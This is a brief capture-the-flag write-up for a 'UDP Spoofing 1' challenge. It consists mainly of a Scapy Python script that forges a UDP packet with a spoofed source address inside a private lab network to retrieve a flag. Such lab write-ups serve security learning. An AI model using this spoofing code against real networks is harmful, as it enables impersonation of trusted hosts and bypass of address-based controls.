# UDP Spoofing 1

#### Just needed to resuse the last script and change the src and dst info. Need the send a packet from the server to the client to get the flag.

```python
from scapy.all import IP, UDP, sr1, Raw

src_ip = "10.0.0.3"
sport = 31337
dst_ip = "10.0.0.2"
dport = 31338
msg = "FLAG"

packet = IP(src=src_ip, dst=dst_ip) / UDP(sport=sport, dport=dport) / msg

print(f"Sending packet: {packet.summary()}")

response = sr1(packet, timeout=5, verbose=0) 

if response:
    response.show() 
    if Raw in response:
        print(f"\nResponse: {response[Raw].load.decode('utf-8')}")
else:
    print("\nNo response received.")
```
